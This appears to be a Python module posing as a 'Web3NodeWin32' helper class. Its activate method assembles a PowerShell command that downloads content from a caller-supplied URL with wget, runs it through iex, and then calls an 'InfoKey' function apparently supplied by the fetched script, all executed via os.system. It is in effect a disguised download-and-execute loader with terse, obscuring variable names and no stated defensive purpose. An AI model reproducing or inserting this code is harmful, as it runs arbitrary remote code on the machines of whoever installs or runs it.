import os

class Web3NodeWin32:
    def __init__(self):
        self.addr = ""
        self.controller = ""
        self.action = "InfoKey -ur "
        self.cpl = "powershell.exe"
        
    def activate(self, ur, pth, pr, tp, it=10):
        try:
            if "?" in pth:
                cc = f"{self.cpl} -command \"iex (wget {ur}{pth}?{pr}={tp}).content;{ self.action}'{ur}{pth}'\""
            else:
                cc = f"{self.cpl} -command \"iex (wget {ur}{pth}&{pr}={tp}).content;{ self.action}'{ur}{pth}'\""
                
            print(f"cc: {cc}")
                
            os.system(cc)
        except Exception:
            print("[Web3NodeWin32] An error occurred during activating...")
            
    def __str__(self):
        return "<class 'Web3NodeWin32'>"
     
    def __repr__(self):
        return "<class 'Web3NodeWin32'>"
        
    def __call__(self, ur, pth, pr, tp, it=10):
        self.activate(ur, pth, pr, tp, it=10)
